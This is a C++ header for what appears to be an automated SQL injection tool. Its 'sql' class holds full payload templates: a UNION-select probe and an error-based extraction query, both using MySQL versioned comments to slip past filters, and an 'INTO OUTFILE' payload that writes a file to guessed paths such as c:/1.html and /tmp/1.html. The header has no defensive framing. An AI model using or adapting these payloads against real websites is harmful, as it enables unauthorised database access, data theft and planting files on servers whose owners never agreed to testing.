#pragma once
#include "pch.h"

using namespace boost;
using namespace boost::beast;
using namespace boost::uuids::detail;
using namespace boost::algorithm;
using namespace nlohmann;
using namespace std;

class sql {

private:
	const char* identity = "FOUNDSQL";
	const char* generic_[50] = { "'", "\"", " " };
	const char* spaces[50] = { " " };
	const char* writes[50] = { "c:/1.html", "d:/1.html", "e:/1.html", "f:/1.html", "h:/1.html", "g:/1.html", "/tmp/1.html" };
	const char* union_template = "GENERICSPACE/*!50000oR*/SPACE1=1SPACE/*!50000AnD*/SPACE0SPACE/*!50000UnIoN*/SPACE/*!50000AlL*/SPACE/*!50000SeLeCt*/SPACENUMBER--SPACE-";
	const char* error_template = "GENERICSPACE/*!50000orSPACE1=1SPACEaNdSPACE(SeLeCtSPACE2*(iF((SeLeCtSPACE*SPACEfRoMSPACE(SeLeCtSPACECONCAT(0x716a787071,(SeLeCtSPACE(ELT(9926=9926,NUMBER))),0x716b786271,0x78))s),SPACE8446744073709551610,SPACE8446744073709551610)))*/--SPACE-";
	const char* write_template = "GENERICSPACE/*!50000or*/SPACE1=1SPACE/*!50000limit*/SPACE0,1SPACE/*!50000into*/SPACE/*!50000outfile*/SPACE\'NUMBER\'SPACElinesSPACEterminatedSPACEbySPACE0x6164656c69617075747269--SPACE-";
	vector<string> query_error_;
	vector<string> query_union_;
	vector<string> query_mssql_;
	vector<string> query_write_;

public:
	sql();
	void query_error();
	void query_union(int max);
	void query_mssql();
	void query_write();
};

